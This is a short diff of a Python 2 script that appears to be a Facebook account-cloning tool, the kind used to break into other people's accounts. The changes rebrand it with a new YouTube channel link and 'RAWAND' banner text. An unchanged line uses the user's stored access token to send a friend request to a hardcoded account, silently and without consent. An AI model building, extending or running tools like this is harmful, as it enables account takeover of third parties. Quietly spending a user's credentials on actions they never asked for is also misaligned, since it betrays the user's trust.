@@ -139,7 +139,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCyo6dFjHh_I1ftQ-a0Is2Aw')
+				os.system('xdg-open https://www.youtube.com/channel/UCwq6RUSe8gO4fUlXxX1HUQA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -297,10 +297,10 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
-	print "   \033[1;31;48m●💋════════════════════════◄►════════════════════════💋●"
+	print "   \033[1;31;48m●💋═RAWAND═RAWAND═RAWAND═RAWAND═RAWAND═◄►💋═RAWAND═RAWAND═RAWAND═RAWAND═RAWAND═●"
 
 	jalan('                    \033[1;91mTricker start cloning Wait...')
-	print  "  \033[1;36;48m ●💋════════════════════════◄►════════════════════════💋●" 
+	print  "  \033[1;36;48m ●💋═RAWAND═RAWAND═RAWAND═RAWAND═RAWAND═◄►💋═RAWAND═RAWAND═RAWAND═RAWAND═RAWAND═●" 
 
 	def main(arg):
 		global cekpoint,oks
